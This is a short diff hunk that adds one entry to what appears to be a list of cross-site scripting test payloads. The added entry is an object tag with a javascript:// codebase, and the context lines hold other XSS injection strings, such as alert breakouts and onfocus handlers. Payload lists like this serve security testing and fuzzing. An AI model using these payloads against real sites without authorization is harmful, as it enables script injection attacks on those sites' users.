@@ -78,3 +78,5 @@ confirm?.(1)
 \";alert('XSS');//
 "autofocus/onfocus=alert(1)//
 '-alert(1)-'
+<object data="# alert(1)" codebase=javascript://>
+
